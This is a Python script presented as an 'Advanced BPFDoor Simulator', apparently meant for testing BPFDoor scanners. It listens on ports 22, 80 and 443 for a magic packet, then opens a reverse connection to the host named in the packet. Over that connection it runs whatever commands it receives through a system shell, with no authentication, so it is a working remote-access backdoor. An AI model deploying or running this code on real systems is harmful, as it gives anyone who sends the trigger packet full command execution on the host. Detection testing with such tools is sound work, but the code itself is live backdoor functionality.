#!/usr/bin/env python3
# Advanced BPFDoor Simulator with Shell Access
# Simulates realistic BPFDoor backdoor behavior including reverse shells

import socket
import threading
import argparse
import struct
import subprocess
import os
import sys
import time
import select

class BPFDoorSimulator:
    def __init__(self, bind_ip='0.0.0.0', ports=[22, 80, 443]):
        self.bind_ip = bind_ip
        self.ports = ports
        self.running = True
        self.active_shells = []
        
    def log(self, message):
        print(f"[{time.strftime('%H:%M:%S')}] {message}")
        
    def parse_magic_packet(self, data):
        """Parse BPFDoor magic packet structure"""
        if len(data) < 24:
            return None
            
        try:
            # Parse packet: flag (4) + ip (4) + port (2) + pass (14)
            flag = struct.unpack('>I', data[0:4])[0]
            ip_bytes = data[4:8]
            port_bytes = data[8:10]
            
            self.log(f"[DEBUG] Received packet - Flag: 0x{flag:08x}")
            
            # Check for magic numbers
            if flag == 0x52930000:  # TCP magic
                ip = socket.inet_ntoa(ip_bytes)
                port_le = struct.unpack('<H', port_bytes)[0]
                port_be = struct.unpack('>H', port_bytes)[0]
                port = port_be if port_be > 1024 else port_le
                return {'ip': ip, 'port': port, 'protocol': 'TCP', 'mode': 'reverse_shell'}
                
            elif flag == 0x72550000:  # UDP/ICMP magic  
                ip = socket.inet_ntoa(ip_bytes)
                port_le = struct.unpack('<H', port_bytes)[0]
                port_be = struct.unpack('>H', port_bytes)[0]
                port = port_be if port_be > 1024 else port_le
                return {'ip': ip, 'port': port, 'protocol': 'UDP/ICMP', 'mode': 'ssh_backdoor'}
                
        except Exception as e:
            self.log(f"[ERROR] Packet parsing failed: {e}")
            
        return None
    
    def send_initial_response(self, target_ip, target_port):
        """Send initial UDP response like original BPFDoor"""
        try:
            with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as sock:
                sock.sendto(b'1', (target_ip, target_port))
                self.log(f"[+] Sent initial UDP response to {target_ip}:{target_port}")
        except Exception as e:
            self.log(f"[ERROR] Failed to send UDP response: {e}")
    
    def handle_reverse_shell(self, target_ip, target_port):
        """Create reverse shell connection back to scanner"""
        try:
            self.log(f"[+] Initiating reverse shell to {target_ip}:{target_port}")
            
            # Connect back to the scanner
            shell_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            shell_sock.connect((target_ip, target_port))
            
            self.log(f"[+] Reverse shell connected to {target_ip}:{target_port}")
            
            # Send banner
            banner = b"BPFDoor Shell Access Granted\n"
            banner += f"Connected from: {self.bind_ip}\n".encode()
            banner += f"Shell type: /bin/bash\n".encode()
            banner += b"$ "
            shell_sock.send(banner)
            
            # Start shell interaction thread
            shell_thread = threading.Thread(
                target=self.shell_handler, 
                args=(shell_sock, target_ip, target_port)
            )
            shell_thread.daemon = True
            shell_thread.start()
            self.active_shells.append(shell_thread)
            
        except Exception as e:
            self.log(f"[ERROR] Reverse shell failed: {e}")
    
    def shell_handler(self, sock, target_ip, target_port):
        """Handle interactive shell session"""
        try:
            while self.running:
                # Check if socket has data
                ready = select.select([sock], [], [], 1.0)
                if ready[0]:
                    data = sock.recv(1024)
                    if not data:
                        break
                        
                    command = data.decode().strip()
                    if not command:
                        sock.send(b"$ ")
                        continue
                        
                    self.log(f"[SHELL] Command from {target_ip}: {command}")
                    
                    # Handle special commands
                    if command.lower() in ['exit', 'quit']:
                        sock.send(b"Shell terminated by user\n")
                        break
                    elif command.lower() == 'help':
                        help_text = b"BPFDoor Shell Commands:\n"
                        help_text += b"  help     - Show this help\n"
                        help_text += b"  whoami   - Show current user\n"
                        help_text += b"  pwd      - Show current directory\n"
                        help_text += b"  ls       - List files\n"
                        help_text += b"  exit     - Close shell\n"
                        help_text += b"  [cmd]    - Execute system command\n"
                        sock.send(help_text)
                        sock.send(b"$ ")
                        continue
                    
                    # Execute system command
                    try:
                        # Use shell=True for better command compatibility on macOS
                        result = subprocess.run(
                            command, 
                            shell=True, 
                            capture_output=True, 
                            text=True, 
                            timeout=10
                        )
                        
                        output = result.stdout
                        error = result.stderr
                        
                        if output:
                            sock.send(output.encode())
                        if error:
                            sock.send(f"Error: {error}".encode())
                            
                    except subprocess.TimeoutExpired:
                        sock.send(b"Command timeout\n")
                    except Exception as cmd_error:
                        sock.send(f"Command failed: {cmd_error}\n".encode())
                    
                    sock.send(b"$ ")
                    
        except Exception as e:
            self.log(f"[ERROR] Shell handler error: {e}")
        finally:
            sock.close()
            self.log(f"[+] Shell session with {target_ip}:{target_port} closed")
    
    def handle_ssh_backdoor(self, target_ip, target_port):
        """Simulate SSH backdoor mode"""
        try:
            self.log(f"[+] Initiating SSH backdoor to {target_ip}:{target_port}")
            
            # Connect back for SSH simulation
            ssh_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            ssh_sock.connect((target_ip, target_port))
            
            # Send SSH-like banner
            ssh_banner = b"SSH-2.0-OpenSSH_8.0 (BPFDoor)\n"
            ssh_banner += b"Password authentication bypassed\n"
            ssh_banner += b"Welcome to compromised system\n"
            ssh_banner += f"Last login: {time.ctime()}\n".encode()
            ssh_banner += b"user@compromised:~$ "
            
            ssh_sock.send(ssh_banner)
            
            # Handle SSH session
            ssh_thread = threading.Thread(
                target=self.ssh_handler, 
                args=(ssh_sock, target_ip, target_port)
            )
            ssh_thread.daemon = True
            ssh_thread.start()
            self.active_shells.append(ssh_thread)
            
        except Exception as e:
            self.log(f"[ERROR] SSH backdoor failed: {e}")
    
    def ssh_handler(self, sock, target_ip, target_port):
        """Handle SSH-like session"""
        try:
            while self.running:
                ready = select.select([sock], [], [], 1.0)
                if ready[0]:
                    data = sock.recv(1024)
                    if not data:
                        break
                        
                    command = data.decode().strip()
                    if not command:
                        sock.send(b"user@compromised:~$ ")
                        continue
                        
                    self.log(f"[SSH] Command from {target_ip}: {command}")
                    
                    if command.lower() in ['exit', 'logout']:
                        sock.send(b"Connection to compromised closed.\n")
                        break
                    
                    # Execute command
                    try:
                        result = subprocess.run(
                            command, 
                            shell=True, 
                            capture_output=True, 
                            text=True, 
                            timeout=10
                        )
                        
                        if result.stdout:
                            sock.send(result.stdout.encode())
                        if result.stderr:
                            sock.send(result.stderr.encode())
                            
                    except Exception as e:
                        sock.send(f"bash: {command}: command failed\n".encode())
                    
                    sock.send(b"user@compromised:~$ ")
                    
        except Exception as e:
            self.log(f"[ERROR] SSH handler error: {e}")
        finally:
            sock.close()
            self.log(f"[+] SSH session with {target_ip}:{target_port} closed")
    
    def handle_connection(self, conn, addr, port):
        """Handle incoming connections to simulated services"""
        try:
            self.log(f"[*] Connection from {addr[0]}:{addr[1]} on port {port}")
            
            # Receive magic packet
            data = conn.recv(1024)
            if not data:
                return
                
            # Parse magic packet
            magic_info = self.parse_magic_packet(data)
            if not magic_info:
                self.log(f"[-] No valid magic packet from {addr[0]}")
                return
                
            self.log(f"[!] Magic packet detected from {addr[0]}")
            self.log(f"    Protocol: {magic_info['protocol']}")
            self.log(f"    Mode: {magic_info['mode']}")
            self.log(f"    Callback IP: {magic_info['ip']}")
            self.log(f"    Callback Port: {magic_info['port']}")
            
            # Send initial response
            self.send_initial_response(magic_info['ip'], magic_info['port'])
            
            # Wait a bit before establishing backdoor
            time.sleep(2)
            
            # Execute appropriate payload
            if magic_info['mode'] == 'reverse_shell':
                self.handle_reverse_shell(magic_info['ip'], magic_info['port'])
            elif magic_info['mode'] == 'ssh_backdoor':
                self.handle_ssh_backdoor(magic_info['ip'], magic_info['port'])
                
        except Exception as e:
            self.log(f"[ERROR] Connection handler error: {e}")
        finally:
            conn.close()
    
    def start_port_listener(self, port):
        """Start listener on specific port"""
        try:
            server_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            server_sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            server_sock.bind((self.bind_ip, port))
            server_sock.listen(5)
            
            self.log(f"[*] Advanced BPFDoor listening on {self.bind_ip}:{port}")
            
            while self.running:
                try:
                    server_sock.settimeout(1.0)
                    conn, addr = server_sock.accept()
                    
                    # Handle connection in separate thread
                    conn_thread = threading.Thread(
                        target=self.handle_connection,
                        args=(conn, addr, port)
                    )
                    conn_thread.daemon = True
                    conn_thread.start()
                    
                except socket.timeout:
                    continue
                except Exception as e:
                    if self.running:
                        self.log(f"[ERROR] Listener error on port {port}: {e}")
                    break
                    
        except Exception as e:
            self.log(f"[ERROR] Failed to start listener on port {port}: {e}")
        finally:
            server_sock.close()
    
    def start(self):
        """Start BPFDoor simulator"""
        self.log("Starting Advanced BPFDoor Simulator...")
        self.log("Capabilities: Reverse Shell, SSH Backdoor, Interactive Terminal")
        
        # Start listeners for each port
        threads = []
        for port in self.ports:
            thread = threading.Thread(target=self.start_port_listener, args=(port,))
            thread.daemon = True
            thread.start()
            threads.append(thread)
        
        self.log(f"[*] Listening on {len(self.ports)} ports")
        self.log("[*] Waiting for magic packets...")
        self.log("[*] Press Ctrl+C to stop")
        
        try:
            # Keep main thread alive
            while self.running:
                time.sleep(1)
        except KeyboardInterrupt:
            self.log("\n[*] Shutting down simulator...")
            self.running = False
            
            # Wait for active shells to close
            if self.active_shells:
                self.log(f"[*] Waiting for {len(self.active_shells)} active shells to close...")
                time.sleep(2)
            
            self.log("[*] Simulator stopped")

def main():
    parser = argparse.ArgumentParser(description='Advanced BPFDoor Simulator with Shell Access')
    parser.add_argument('-i', '--ip', default='0.0.0.0', 
                       help='IP address to bind to (default: 0.0.0.0)')
    parser.add_argument('-p', '--ports', default='22,80,443', 
                       help='Comma-separated list of ports (default: 22,80,443)')
    
    args = parser.parse_args()
    
    # Parse ports
    try:
        ports = [int(p.strip()) for p in args.ports.split(',')]
    except ValueError:
        print("[!] Error: Invalid port list")
        sys.exit(1)
    
    # Check for privileged ports
    privileged_ports = [p for p in ports if p < 1024]
    if privileged_ports and os.geteuid() != 0:
        print(f"[!] Warning: Ports {privileged_ports} require root privileges")
        print("[!] Run with sudo for ports < 1024")
    
    # Start simulator
    simulator = BPFDoorSimulator(args.ip, ports)
    simulator.start()

if __name__ == "__main__":
    main()
